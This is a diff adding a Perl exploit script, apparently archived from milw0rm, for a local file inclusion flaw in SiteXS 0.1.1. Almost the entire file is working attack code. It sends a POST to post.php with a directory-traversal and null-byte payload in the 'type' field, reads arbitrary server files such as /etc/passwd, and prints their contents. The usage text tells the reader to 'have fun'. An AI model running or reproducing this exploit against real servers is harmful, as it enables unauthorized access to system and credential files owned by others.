@@ -1,0 +1,63 @@
+# --+++==========================================================+++--
+# --+++====== SiteXS <= 0.1.1 Local File Inclusion Exploit ======+++--
+# --+++==========================================================+++--
+
+
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use IO::Socket;
+
+sub usage ()
+{
+	die "\n\nSiteXS <= 0.1.1 Local File Inclusion Exploit".
+	    "\n[+] Author  : darkjoker".
+	    "\n[+] Site    : http://darkjoker.net23.net".
+	    "\n[+] Download: http://heanet.dl.sourceforge.net/sourceforge/sitexs/sitexs-0.1.1.tar.gz".
+	    "\n[+] Usage   : perl ${0} <hostname> <path> <file>".
+	    "\n[+] Ex.     : perl ${0} localhost /SiteXS /etc/passwd".
+	    "\n[+] Notes   : Have fun\n\n";
+}
+
+my ($host, $path, $file) = @ARGV;
+
+usage if (!$file);
+
+my $sock = new IO::Socket::INET (
+	PeerHost => $host,
+	PeerPort => 80,
+	Proto    => "tcp",
+);
+
+my $up = "../"x10;
+
+$file =~ s/^\/// if ($file =~ /^\//);
+
+my $varz = "type=${up}${file}%00";
+
+my $post = "POST ${path}/post.php HTTP/1.1\r\n".
+	"Host:	${host}\r\n".
+	"Connection: Close\r\n".
+	"Content-Type: application/x-www-form-urlencoded\r\n".
+	"Content-Length: " . length ($varz) . "\r\n\r\n".
+	$varz;
+
+print $sock $post;
+
+my $w = 0;
+
+while (<$sock>)
+{
+	$w = 1 if ($w < 0);
+	$w = -1 if ($_ =~ /Content-Type: text\/html/);
+	$w = 0 if ($_ =~ /<br \/>/);
+	print $_ if ($w == 1);
+
+}
+
+print "\n\n";
+
+close ($sock);
+
+# milw0rm.com [2009-01-26]
